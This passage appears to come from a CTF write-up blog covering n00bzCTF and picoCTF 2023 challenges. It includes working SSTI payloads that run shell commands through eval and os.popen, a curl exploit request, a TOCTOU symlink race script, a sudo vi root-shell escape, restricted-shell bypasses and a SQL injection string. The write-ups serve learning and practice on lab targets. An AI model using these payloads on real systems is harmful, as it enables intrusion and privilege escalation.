[\u0026#39;mro\u0026#39;,\u0026#39;url\u0026#39;,\u0026#39;join\u0026#39;,\u0026#39;attr\u0026#39;,\u0026#39;dict\u0026#39;,\u0026#39;()\u0026#39;,\u0026#39;init\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;lipsum\u0026#39;,\u0026#39;current_app\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;subclasses\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;ls\u0026#39;,\u0026#39;flag.txt\u0026#39;,\u0026#39;cycler\u0026#39;,\u0026#39;[]\u0026#39;,\u0026#39;0\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;,\u0026#39;5\u0026#39;,\u0026#39;6\u0026#39;,\u0026#39;7\u0026#39;,\u0026#39;8\u0026#39;,\u0026#39;9\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;:\u0026#39;,\u0026#39;update\u0026#39;,\u0026#39;config\u0026#39;,\u0026#39;self\u0026#39;,\u0026#39;class\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;#\u0026#39;] for b in blacklist: if b in inp: return \u0026#34;Blacklisted word!\u0026#34; if len(inp) \u0026lt;= 70: return inp if len(inp) \u0026gt; 70: return \u0026#34;Input too long!\u0026#34; @app.route(\u0026#39;/\u0026#39;) def main(): return redirect(\u0026#39;/generate\u0026#39;) @app.route(\u0026#39;/generate\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def generate_certificate(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;generate_certificate.html\u0026#39;) elif request.method == \u0026#39;POST\u0026#39;: name = blacklist(request.values[\u0026#39;name\u0026#39;]) teamname = request.values[\u0026#39;team_name\u0026#39;] return render_template_string(f\u0026#39;\u0026lt;p\u0026gt;Haha! No certificate for {name}\u0026lt;/p\u0026gt;\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=52130) Reviewing the source code, we can get an idea on what kind of exploit is involved just by looking at the type of strings blacklisted. These are common python functions, suggesting a python code injection. Exploring where our input is used, we have this line:\n1 render_template_string(f\u0026#39;\u0026lt;p\u0026gt;Haha! No certificate for {name}\u0026lt;/p\u0026gt;\u0026#39;) A very quick google search suggests this might be SSTI, which is reasonable to believe based on the blacklist. We must utilize SSTI to display the contents of flag.txt. Among the commonly used SSTI functions present within the blacklist, we even see flag.txt is among them.\nBypassing blacklist It is clear that this blacklist must be bypassed. One possible approach is to use quotations to break string sequences. Onsra03 proposes {{namespace['__ini''t__']['__global''s__']['o''s']['pop''en']('l\\s')['rea''d'](+)}}. However, with this we quickly approach the 70 char limit.\nFrom the source code it is worth pointing out that only the parameter name is checked for blacklisted characters. If we can supply blacklisted characters in team_name\u0026ndash; or perhaps an unused parameter\u0026ndash;then call team_name again within name, we should be able to pass the blacklisted characters to execute.\nBuilding payload Using global variable g, we can generate a much smaller payload from namespace[__ini''t__]. Secondly, we can utilize request.form to reference a different supplied parameter containing banned strings. At this point, our payload is small enough that referencing team_name is still within the length requirements. However, we could make the name parameter even smaller by referencing some single letter parameter such as a:\n1 name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read() Supplying this as the post request body:\n1 2 curl -X POST http://challs.n00bzunit3d.xyz:52130/generate -d \u0026#34;name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026#34; \u0026lt;p\u0026gt;Haha! No certificate for n00bz{5571_57r1k3s_4g41n_7a1b3f4e5d}\u0026lt;/p\u0026gt; Alternative payload Another interesting approach does not use g.pop but instead utilizes Flask\u0026rsquo;s get_flashed_messages function:\n1 name={{get_flashed_messages[\u0026#39;__built\u0026#39;\u0026#39;ins__\u0026#39;].eval(request.values[\u0026#39;a\u0026#39;])}}\u0026amp;a=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026amp;team_name=b Note that in this situation referencing team_name in request.values will exceed the input length limit, so we utilize a single letter parameter a instead. The values for team_name doesn\u0026rsquo;t matter anymore, so it\u0026rsquo;s just set to b.\n","date":"2023-06-14T20:25:09-05:00","permalink":"https://yuwenmichael.netlify.app/post/n00bzctf_2023/","title":"N00bzCTF_2023"},{"content":"Binary Exploitation tic-tac Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. ssh to saturn.picoctf.net:62983, and run the binary named \u0026ldquo;txtreader\u0026rdquo; once connected. Login as ctf-player with the password, d137d16e\nUpon ssh into machine, we see txtreader binary and flag.txt file, however we don\u0026rsquo;t have permissions to read them. Fortunately, they also give us the pre-compiled code for txtreader so that we might get a better idea on what\u0026rsquo;s going on:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; int main(int argc, char *argv[]) { if (argc != 2) { std::cerr \u0026lt;\u0026lt; \u0026#34;Usage: \u0026#34; \u0026lt;\u0026lt; argv[0] \u0026lt;\u0026lt; \u0026#34; \u0026lt;filename\u0026gt;\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } std::string filename = argv[1]; std::ifstream file(filename); struct stat statbuf; // Check the file\u0026#39;s status information. if (stat(filename.c_str(), \u0026amp;statbuf) == -1) { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: Could not retrieve file information\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Check the file\u0026#39;s owner. if (statbuf.st_uid != getuid()) { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: you don\u0026#39;t own this file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Read the contents of the file. if (file.is_open()) { std::string line; while (getline(file, line)) { std::cout \u0026lt;\u0026lt; line \u0026lt;\u0026lt; std::endl; } } else { std::cerr \u0026lt;\u0026lt; \u0026#34;Error: Could not open file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } return 0; } Essentially, the file first checks if the file exists, then checks if our permission to view the file. If we are allowed to view, it will read the file contents. It\u0026rsquo;s also worth noting that txtreader has SUID bit set, allowing it to run as root when we use:\n1 2 $ ls -l txtreader -rwsr-xr-x 1 root root 19016 Mar 16 02:28 txtreader If we can send the textreader to open a file we have permissions on, then quickly swap it with a file linked to the flag, we should be able to trick the program into reading the flag contents for us. This is known as a Race Condition, or TOCTOU type of problem. This video by John Hammond covers a similar CTF challenge, and the solution can be done with the same approach. 1. We will create our own file called link with touch, that we can read/write to. 2. We will start txtreader, and tell it to read link, which is owned by us. 3. txtreader will check the file, and confirm we have permission to read the file 4. We will delete link, and create a new link file that is symlinked to flag.txt. Now when things want to interact with link, they are pointed to flag.txt 5. txtreader will attempt to read link, except it now points to flag.txt. Since it already confirmed we have permissions, it will output the contents of flag.txt Since txtreader won\u0026rsquo;t be waiting for us to manipulate the files in between actions, we have to be very fast, hence the race aspect. Our human action speeds aren\u0026rsquo;t nearly good enough, so what we can do is loop the action of swapping link , while also looping the run of txtreader. After enough runs, hopefully our action timings will line up and we can get the flag. Making the link loop, linker.sh:\n1 2 3 4 5 6 7 while true do rm link touch link rm link ln -s /home/ctf-player/flag.txt link done Setting up the linker loop and running txtreader:\n1 2 3 4 5 6 7 8 9 ctf-player@pico-chall$ chmod +x linker.sh ctf-player@pico-chall$ ./linker.sh rm: cannot remove \u0026#39;link\u0026#39;: No such file or directory ^Z [1]+ Stopped ./linker.sh ctf-player@pico-chall$ bg 1 [1]+ ./linker.sh \u0026amp; ctf-player@pico-chall$ while [ 1 ]; do ./txtreader link; done 2\u0026gt;/dev/null picoCTF{ToctoU_!s_3a5y_f482a247} Overall while this method works, it is not very reliable. Sometimes you can get lucky and the flag is read after a few minutes of running, other times it had not succeeded once in the full 15min duration of the instance.\npicoCTF{ToctoU_!s_3a5y_f482a247}\nPotential Solution\u0026ndash;Reliable race fixing? It might be possible to \u0026ldquo;fix\u0026rdquo; the race for us, resulting in very reliable success of flag read. This post describes using a filesystem maze too large for the system to handle in memory at once, allowing for a more clear window of opportunity for us to switch targets. The maze consists of many nested folders, containing symlinks pointing to another batch of nested folders. After repeating for x times, the final link points to the file we own. The maze is too large to be placed in the filesystem cache, and this process results in slower navigation and an increased delay between the action of checking permissions and the action of reading the file contents.\nWhile I did not have time to utilize this trick on tic-tac, it might be worth exploring on another CTF challenge.\ntwo-sum Can you solve this? What two positive numbers can make this possible: n1 \u0026gt; n1 + n2 OR n2 \u0026gt; n1 + n2 Enter them here nc saturn.picoctf.net 56856. Source\nEssentially, we need a result where combining two positive numbers results in a smaller number. Sounds impossible, right? We can achieve this by causing an integer overflow, or inputting two large numbers that will overflow the \u0026ldquo;limit\u0026rdquo; and come back as a lower value result.\n1 2 3 4 5 6 7 $ nc saturn.picoctf.net 56856 n1 \u0026gt; n1 + n2 OR n2\u0026gt; n1 + n2 What two positive numbers can make this possible: 5555555555 5555555555 You have entered 1260588259 and 1260588259 You have an integer overflow YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9} Note that despite entering 5 555 555 555, it shows that we entered number 1 260 588 259. When we provided a number above the acceptable limit the value overflowed, and our result is something much lower. Now when the 1 260 588 259 is added together, it is still lower than our original input 5 555 555 555. Overflow achieved!\npicoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}\nForensics hideme Every file gets a flag. The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye here.\nDownloading the file shows flag.png. Exiftool tells me there\u0026rsquo;s more to this image than first shown:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 exiftool flag.png ExifTool Version Number : 12.57 File Name : flag.png Directory : . File Size : 43 kB File Modification Date/Time : 2023:03:14 17:08:24-04:00 File Access Date/Time : 2023:03:14 17:08:50-04:00 File Inode Change Date/Time : 2023:03:14 17:08:30-04:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 512 Image Height : 504 Bit Depth : 8 Color Type : RGB with Alpha Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Warning : [minor] Trailer data after PNG IEND chunk Image Size : 512x504 Megapixels : 0.258 The warning tells us there is extra data after the image information is done, the PNG IEND chunk. We can verify this ourselves with xxd:\n1 2 3 4 5 6 7 8 9 10 11 xxd flag.png \u0026lt;...snip...\u0026gt; 00009b20: 0448 2004 02ff 0fe1 93e1 23be c327 2900 .H .......#..\u0026#39;). 00009b30: 0000 0049 454e 44ae 4260 8250 4b03 040a ...IEND.B`.PK... 00009b40: 0000 0000 001c 136c 5600 0000 0000 0000 .......lV....... 00009b50: 0000 0000 0007 001c 0073 6563 7265 742f .........secret/ 00009b60: 5554 0900 03f7 370d 64f7 370d 6475 780b UT....7.d.7.dux. 00009b70: 0001 0400 0000 0004 0000 0000 504b 0304 ............PK.. 00009b80: 1400 0000 0800 1c13 6c56 656c 5c74 810b ........lVel\\t.. 00009b90: 0000 1b0c 0000 0f00 1c00 7365 6372 6574 ..........secret \u0026lt;...snip...\u0026gt; Using binwalk, we can see the segmented data:\n1 2 3 4 5 6 7 8 9 $ binwalk ./flag.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced 41 0x29 Zlib compressed data, compressed 39739 0x9B3B Zip archive data, at least v1.0 to extract, name: secret/ 39804 0x9B7C Zip archive data, at least v2.0 to extract, compressed size: 2945, uncompressed size: 3099, name: secret/flag.png 42984 0xA7E8 End of Zip archive, footer length: 22 This can also be separated with binwalk:\n1 $ binwalk -D=\u0026#34;.*\u0026#34; ./flag.png The output file is a folder titled _flag.png.extracted\n1 2 3 4 5 6 7 8 9 $ ls -al total 108 drwxr-xr-x 3 kali kali 4096 Mar 14 17:37 . drwxr-xr-x 3 kali kali 4096 Mar 14 17:28 .. -rw-r--r-- 1 kali kali 43006 Mar 14 17:28 0 -rw-r--r-- 1 kali kali 0 Mar 14 17:28 29 -rw-r--r-- 1 kali kali 42965 Mar 14 17:28 29-0 -rw-r--r-- 1 kali kali 3267 Mar 14 17:28 9B3B -rw-r--r-- 1 kali kali 22 Mar 14 17:28 A7E8 After the bulk of data, 9B3B, it appears to be compressed information:\n1 2 $ file 9B3B 9B3B: Zip archive data, at least v1.0 to extract, compression method=store Rename it as zip file and unzip:\n1 $ mv 9B3B 9B3B.zip \u0026amp;\u0026amp; unzip 9B3B.zip Resulting output is folder secret with yet another flag.png:\n1 2 $ file flag.png flag.png: PNG image data, 600 x 50, 16-bit grayscale, non-interlaced Opening this image shows our flag.\nGeneral Skills chrono How to automate tasks to run at intervals on linux servers? Additional details will be available after launching your challenge instance\nFor this challenge, we are given a hint toward how linux servers might automate tasks.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nLinux systems are able to automate tasks on regular intervals through the usage of cron. More info can be found on the Linux manual page. The customizable settings for cron jobs can be found in a file called crontab, which is always located in the /etc/ directory. We can check for a crontab file using ls:\n1 2 picoplayer@challenge:~$ ls /etc/crontab /etc/crontab Now that we have confirmed it is there, we can output the contents in plaintext using cat:\n1 2 picoplayer@challenge:~$ cat /etc/crontab # picoCTF{Sch3DUL7NG_T45K3_L1NUX_7754e199} money-ware Flag format: picoCTF{Malwarename} The first letter of the malware name should be capitalized and the rest lowercase. Your friend just got hacked and has been asked to pay some bitcoins to 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?\nIn this challenge, we are given a bitcoin address, and information that this address is used to siphon money from an innocent friend\u0026rsquo;s bitcoin wallet. Since blockchain transactions are publicly disclosed, we can view the activity associated with this wallet on a quick Google search.\nwww.bitcoinabuse.com is a website dedicated to tracking bitcoin addresses used in ransomeware and blackmailings, so if our address was used in other previous attacks, we can find reports for our given address.\nSearching this address we see several reports for multiple abuse types. Since we know our friend had been hacked, the abuse type is likely a ransomeware attack. The first report against this address is labeled ransomeware, and provides a link where we might learn more:\nMore information here: https://blog.avira.com/petya-strikes-back/\nThe title of the article plainly tells us the malware at play is based on the infamous ransomeware Petya, but we can also follow the link to learn more about it.\nWe are told the answer to the flag is the malware involved, so we can submit the flag by inserting \u0026ldquo;Petya\u0026rdquo; into the picoCTF flag format. picoCTF{Petya}\nPermissions Can you read files in the root file?\nAdditional details will be available after launching your challenge instance.\nThis challenge asks us to read a file in the /root directory. Files located here are typically under the highest access protections possible, requiring only root permissions and rejecting any other non-super user.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nFirstly, we can check our own user privileges:\n1 2 picoplayer@challenge:~$ id uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer) We can see we are not a part of root in any way, uid gid or part of the root group. It is unlikely we can access /root, so it is unsurprising to see we are denied:\n1 2 picoplayer@challenge:/$ cd /root -bash: cd: /root: Permission denied We need to find a way to elevate our permissions before we can go here.\nA common approach to elevating privileges is to do super-user actions, through the command sudo. Users are often limited in the kinds of sudo actions they can do. We can check what is allowed for our user by typing sudo -l:\n1 2 3 4 5 6 7 picoplayer@challenge:/$ sudo -l Matching Defaults entries for picoplayer on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User picoplayer may run the following commands on challenge: (ALL) /usr/bin/vi Notably, we can run /usr/bin/vi as any user, including root, as noted by the (ALL). vi is a common text editor used to edit files. Since we are interested in reading the contents of a file, opening the file using vi is enough to tell us what\u0026rsquo;s inside.\n1 picoplayer@challenge:/$ sudo vi /root/flag.txt However, when we do this we don\u0026rsquo;t see anything? This is because even though we know the location of the flag, we are still guessing if it is called flag.txt or something else. We need a way to explore the contents of the /root directory.\nWhile vi has the main purpose of being a text editor, we can also abuse some of it\u0026rsquo;s other features to obtain an interactive terminal session as user root:\n1 sudo vi -c \u0026#39;:!/bin/bash\u0026#39; Here, we launch vi with sudo vi. With -c flag, we specify a command :!/bin/bash for vi to run on launch. Alternatively, we can do this ourselves after launching vi. Simply typing :shell will open a shell session as the current user, in this case, root.\nNow we can access /root:\n1 2 root@challenge:~# ls root@challenge:~# Typing ls shows no file in root? The challenge description mentions reading files in root, so surely something must be here:\n1 2 root@challenge:~# ls -a . .. .bashrc .flag.txt .profile By adding -a flag to ls we can see hidden files. There is our flag, under .flag.txt. So, the reason we couldn\u0026rsquo;t find it earlier was because the name was indeed different from what we expected. We can revisit to see that, once the proper name is supplied, vi could have been used to view file contents:\n1 picoplayer@challenge:~$ sudo vi /root/.flag.txt 1 2 3 picoCTF{uS1ng_v1m_3dit0r_021d10ab} ~ ~ Repititions Can you make sense of this file? Download the file here.\nHere we are tasked with making sense of a file. Following the link prompts us to download a file called enc_flag. Enc is almost certainly shorthand for encoded, meaning our flag will probably need to go through some decoding processes.\n1 2 3 4 5 6 $ cat enc_flag VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW VkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZs aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg== Dumping the contents in plaintext, we can see that it is clearly not human-readable. A string such as this, ending with =, is very likely encoded with base64. We can use an online decoding tool such as CyberChef to get through this quickly, or we can use the linux command base64 to do this as well:\n1 2 3 4 5 $ cat enc_flag | base64 -d VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVkM0JUVWpOUk1WWkhOWGRYCmF6QjRZMFZXVkdGdGVFVlhi bTkzVDFWT2JsQlVNRXNLCg== From our cat output we use | to redirect straight to another command, base64. Setting -d means the data will be base64 decoded. Despite this, the data is still unreadable. And we still see it ending in =? It appears the flag has been through multiple layers of encoding. We can decode for multiple rounds through the same method as before:\n1 2 $ cat enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_492767d2} Finally after 6 rounds of decoding, the flag appears in plaintext.\nSpecial Don\u0026rsquo;t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized\u0026hellip; automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That\u0026rsquo;s Special (TM) Start your instance to see connection details.\nAdditional details will be available after launching your challenge instance.\nWhen we first enter, we might be inclined to check what is in our home:\n1 2 3 Special$ ls Is sh: 1: Is: not found Our ls command is converted to Is, and then fails to execute. Checking a few other commands leads all syntax being altered to similar legitimate words, and all of them starting with capitilization. With our syntax ruined, we cannot execute commands properly! If we attempt to enter a different shell terminal, we receive an interesting rejection:\n1 2 Special$ bash Why go back to an inferior shell? My first thought is if my input is being altered after input but before bash processing, perhaps I can use characters designated to escaping metacharacter interpretation. In bash, the backslash \\ character is used to escape regular interpretations, and generally treats the character as raw text.\n1 2 3 Special$ \\ls Als sh: 1: Als: not found Unfortunately, trying to escape the l in ls, which was previously converted to I, produces something completely different. Trying again with other commands, I manage to execute whoami. Perhaps I am on to something?\n1 2 3 Special$ \\whoami \\whoami ctf-player As it stands currently, we are escaping only 1 character, but the others are still treated as regular components of a string. What if we escape every character?\n1 2 3 Special$ \\e\\c\\h\\o test \\e\\c\\h\\o test test We can successfully perform echo! However, for some strange reason ls is not working:\n1 2 3 Special$ \\l\\s Plus sh: 1: Plus: not found Perhaps the problem is caused by ls being only 2 characters? Regardless, we have other ways to look around:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Special$ \\d\\i\\r \\d\\i\\r blargh Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h \\c\\a\\t \\b\\l\\a\\r\\g\\h cat: blargh: Is a directory Special$ \\d\\i\\r \\b\\l\\a\\r\\g\\h \\d\\i\\r \\b\\l\\a\\r\\g\\h flag.txt Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6} While this approached works, it is rather tedious and ugly. We can escape this special shell by invoking bash:\n1 2 3 4 Special$ \\b\\a\\s\\h \\b\\a\\s\\h ctf-player@challenge:~$ whoami ctf-player Now we are free!\nSpecialer Reception of Special has been cool to say the least. That\u0026rsquo;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just \u0026lsquo;Specialer\u0026rsquo;. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody\u0026rsquo;s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.\nAdditional details will be available after launching your challenge instance.\nUpon entering, we might want to look around. However, we instantly come up with a problem:\n1 2 Specialer$ ls -bash: ls: command not found From the looks of it, ls is not accessible in our PATH. Specifying the full path does not help, and we soon find that we may not have access to any binaries:\n1 2 3 4 Specialer$ /usr/bin/ls -bash: /usr/bin/ls: No such file or directory Specialer$ locate ls -bash: locate: command not found Using tab auto-complete to navigate, we can see we are in a very restricted environment, and the only binary available is bash:\n1 2 3 Specialer$ cd / bin/ home/ lib/ lib64/ Specialer$ cd /bin/bash Note: Tabbing at / suggests bin, home, lib and lib64. Tabbing at /bin/ auto suggessts bash. This must be the only file in the directory.\nAt least with bash, we still have access to built-ins. Since our terminal commands are so limited, we can actually list them all by pressing tab twice on an empty line:\n1 2 3 4 5 6 7 8 9 10 11 12 Specialer$ ! builtin dirs exit history pushd suspend unalias ./ caller disown export if pwd test unset : case do false in read then until [ cd done fc jobs readarray time wait [[ command echo fg kill readonly times while ]] compgen elif fi let return trap { alias complete else for local select true } bash compopt enable function logout set type bg continue esac getopts mapfile shift typeset bind coproc eval hash popd shopt ulimit break declare exec help printf source umask We can utilize echo to see one directory layer at a time:\n1 2 3 4 5 Specialer$ echo * abra ala sim Specialer$ echo */* abra/cadabra.txt abra/cadaniel.txt ala/kazam.txt ala/mode.txt sim/city.txt sim/salabim.txt We have several txt files here to view, but unfortunately no common binary to read them with. Bash also comes with a read built-in, combined with echo, we can output contents within files\n1 2 Specialer$ read IFR \u0026lt; abra/cadabra.txt; echo $IFR Nothing up my sleeve! Now that the contents are displayed, perhaps one option can give us a flag?\n1 2 Specialer$ read IFR \u0026lt; ala/kazam.txt; echo $IFR return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78} Useless There\u0026rsquo;s an interesting script in the user\u0026rsquo;s home directory\nAdditional details will be available after launching your challenge instance.\nFor this challenge we are given a simple script, and told to explore the script to obtain the flag.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nwe see the script in our home directory, with executable premissions:\n1 2 3 4 5 6 7 8 9 picoplayer@challenge:~$ ls -al total 16 drwxr-xr-x 1 picoplayer picoplayer 20 Mar 17 18:38 . drwxr-xr-x 1 root root 24 Mar 16 02:30 .. -rw-r--r-- 1 picoplayer picoplayer 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25 2020 .bashrc drwx------ 2 picoplayer picoplayer 34 Mar 17 18:38 .cache -rw-r--r-- 1 picoplayer picoplayer 807 Feb 25 2020 .profile -rwxr-xr-x 1 root root 517 Mar 16 01:30 useless First, we check the kind of file we are working with:\n1 2 picoplayer@challenge:~$ file useless useless: Bourne-Again shell script, ASCII text executable This is a bash script, written in plaintext. We will be able to easily view the contents with a simple cat command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 picoplayer@challenge:~$ cat useless #!/bin/bash # Basic mathematical operations via command-line arguments if [ $# != 3 ] then echo \u0026#34;Read the code first\u0026#34; else if [[ \u0026#34;$1\u0026#34; == \u0026#34;add\u0026#34; ]] then sum=$(( $2 + $3 )) echo \u0026#34;The Sum is: $sum\u0026#34; elif [[ \u0026#34;$1\u0026#34; == \u0026#34;sub\u0026#34; ]] then sub=$(( $2 - $3 )) echo \u0026#34;The Substract is: $sub\u0026#34; elif [[ \u0026#34;$1\u0026#34; == \u0026#34;div\u0026#34; ]] then div=$(( $2 / $3 )) echo \u0026#34;The quotient is: $div\u0026#34; elif [[ \u0026#34;$1\u0026#34; == \u0026#34;mul\u0026#34; ]] then mul=$(( $2 * $3 )) echo \u0026#34;The product is: $mul\u0026#34; else echo \u0026#34;Read the manual\u0026#34; fi fi It appears the script is performing basic math, based on whatever operation you tell it to perform. For example, a division problem\n1 2 picoplayer@challenge:~$ ./useless div 10 2 The quotient is: 5 If we don\u0026rsquo;t supply 3 arguments, we are told to read the code. If we don\u0026rsquo;t supply a valid math operation, we are told to read the manual. There is not much to go on with this program here. We can see if a manual exists for this by using man:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 man useless useless useless, -- This is a simple calculator script SYNOPSIS useless, [add sub mul div] number1 number2 DESCRIPTION Use the useless, macro to make simple calulations like addition,subtraction, multi- plication and division. Examples ./useless add 1 2 This will add 1 and 2 and return 3 ./useless mul 2 3 This will return 6 as a product of 2 and 3 ./useless div 6 3 This will return 2 as a quotient of 6 and 3 ./useless sub 6 5 This will return 1 as a remainder of substraction of 5 from 6 Authors This script was designed and developed by Cylab Africa picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_5562} Turns out a man page exists, and our flag was placed here as well. Great..\nWeb findme Help us test the form by submiting the username as test and password as test! The website running here\nUpon logging in, we cycle through a couple blank pages very quickly before landing at http://saturn.picoctf.net:54197/home. The page contains a search bar and a small note: \u0026ldquo;I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)\u0026rdquo;\nSearching for a few keywords leads us to no result. The note on this page mentions the redirects as well, so let\u0026rsquo;s use burpsuite to catch and analyze each step that\u0026rsquo;s occuring. First login request:\nFirst redirect:\nSecond redirect:\nThen finally we are sent to home. There isn\u0026rsquo;t much to go on aside from the second redirect has an id value that looks like base64 encoding. Decoding the string:\n1 2 $ echo \u0026#34;bF90aGVfd2F5XzAxZTc0OGRifQ==\u0026#34; | base64 -d l_the_way_01e748db} This is looking like half of a flag. Combining the two id values together and base64 decoding might get us the flag:\n1 2 echo \u0026#34;cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==\u0026#34; | base64 -d picoCTF{proxies_all_the_way_01e748db} MatchTheRegex How about trying to match a regular expression The website is running here.\nGoing to the page, we see an input box to input our search. Based on the name, my first thought is that this will be a regular expression search, where we must input a regex term that will hit positive for specifically the flag. After trying several different regex queries, I\u0026rsquo;m not having any luck. Looking at the page source, I notice a hint displayed in comments:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; function send_request() { let val = document.getElementById(\u0026#34;name\u0026#34;).value; // ^p.....F!? fetch(`/flag?input=${val}`) .then(res =\u0026gt; res.text()) .then(res =\u0026gt; { const res_json = JSON.parse(res); alert(res_json.flag) return false; }) return false; } \u0026lt;/script\u0026gt; ^p.....F!? In regex searches, ^ refers to the start of a line and $ refers to the end of a line, so perhaps this hint can be a working query?\nUnfortunately not.. Playing with the provided hint a little more, I get a successful match by being more generic:\nDespite being a regex based search, and the commented page source including the ^ marker for the beginning of a line, including the ^ in our search causes it to fail.. picoCTF{succ3ssfully_matchtheregex_f89ea585}\nMore_SQLi Can you find the flag on this website. Try to find the flag here\nThanks to sergyperov for the helpful writeup!\nEntering the site we see a login page. Considering the name of the challenge, we will start with a simple SQL injection payload: 'or 1=1-- On the first attempt with a random input, we get an error. This is more useful than usual, however, as it tells us the SQL query happening in the background:\n1 2 3 username: \u0026#39;or 1=1-- password: 345534 SQL query: SELECT id FROM users WHERE password = \u0026#39;345534\u0026#39; AND username = \u0026#39;\u0026#39;or 1=1-- \u0026#39; Since password is being called first, we can insert our injection into 